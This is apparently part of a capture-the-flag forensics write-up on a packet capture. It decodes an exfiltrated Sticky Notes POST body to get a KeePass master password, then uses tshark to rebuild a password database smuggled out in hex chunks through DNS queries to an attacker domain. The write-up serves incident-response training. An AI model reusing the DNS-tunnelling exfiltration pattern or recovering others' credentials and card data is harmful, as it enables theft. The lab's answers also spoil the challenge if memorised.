Query `http contains ".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite"` and follow its TCP stream. Move to the next TCP stream (750) to find the corresponding POST request, which contains the encoded sensitive information.

```
92 105 100 61 56 54 56 49 53 48 98 100 45 97 53 54 52 45 52 50 51 98 45 57 50 53 54 45 55 48 100 51 55 56 49 55 57 52 98 49 32 77 97 115 116 101 114 32 80 97 115 115 119 111 114 100 13 10 92 105 100 61 97 100 56 98 53 50 102 48 45 101 49 98 98 45 52 48 102 54 45 98 98 102 57 45 52 55 97 53 51 102 57 49 56 48 97 98 32 37 112 57 94 51 33 108 76 94 77 122 52 55 69 50 71 97 84 94 121 124 77 97 110 97 103 101 100 80 111 115 105 116 105 111 110 61 68 101 118 105 99 101 73 100 58 92 92 63 92 68 73 83 80 76 65 89 35 68 101 102 97 117 108 116 95 77 111 110 105 116 111 114 35 49 38 51 49 99 53 101 99 100 52 38 48 38 85 73 68 50 53 54 35 123 101 54 102 48 55 98 53 102 45 101 101 57 55 45 52 97 57 48 45 98 48 55 54 45 51 51 102 53 55 98 102 52 101 97 97 55 125 59 80 111 115 105 116 105 111 110 61 49 49 48 54 44 52 51 59 83 105 122 101 61 51 50 48 44 51 50 48 124 49 124 48 124 124 89 101 108 108 111 119 124 48 124 124 124 124 124 124 48 124 124 56 99 97 50 50 99 48 101 45 98 97 53 101 45 52 57 57 97 45 97 56 54 99 45 55 52 55 51 97 53 51 100 99 54 100 101 124 55 52 102 48 56 55 50 52 45 99 99 99 57 45 52 99 101 54 45 57 52 101 55 45 56 99 57 57 101 54 99 100 52 50 99 54 124 54 51 56 48 57 50 50 52 55 51 57 55 49 57 57 53 56 57 124 124 54 51 56 48 57 50 50 52 55 53 49 54 49 48 55 48 55 57 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 85 115 101 114 115 92 106 46 119 101 115 116 99 111 116 116 13 10 13 10 13 10
```

Decode this from Decimal.

```
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y|ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#1&31c5ecd4&0&UID256#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=1106,43;Size=320,320|1|0||Yellow|0||||||0||8ca22c0e-ba5e-499a-a86c-7473a53dc6de|74f08724-ccc9-4ce6-94e7-8c99e6cd42c6|638092247397199589||638092247516107079

Path               
----               
C:\Users\j.westcott
```

The password is **%p9^3!lL^Mz47E2GaT^y**.

### What is the credit card number stored inside the exfiltrated file?

Because `protected_data.kdbx` was exfiltrated in hex chunks through DNS queries of the form `$line.bpakcaging.xyz`, it must be reconstructed then decoded accordingly.

```bash
tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' | xxd -r -p > protected_data.kdbx
```

Open this with `KeePass` and enter the password discovered in the previous question to find the credit card number **4024007128269551**.